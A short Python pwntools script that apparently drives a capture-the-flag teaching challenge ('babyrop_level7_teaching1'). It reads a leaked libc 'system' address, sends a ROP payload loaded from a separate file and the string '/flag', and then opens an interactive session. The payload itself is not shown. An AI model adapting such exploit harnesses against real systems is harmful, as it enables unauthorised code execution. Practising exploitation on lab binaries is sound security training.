#!/usr/bin/env python3

import pwn

# Create a process
#binary = pwn.process(['strace', '/babyrop_level7_teaching1'])  # Debugging purpose
binary = pwn.process(['/babyrop_level7_teaching1'])

# Receive lines
print(binary.recvline_contains(b"[LEAK] The address of \"system\" in libc is: 0x"))
input('Press [Enter] to continue..')

# First input
with open("payload", "rb") as f:
    binary.sendline(f.read())

# Second input
binary.sendline(b"/flag")
binary.interactive()
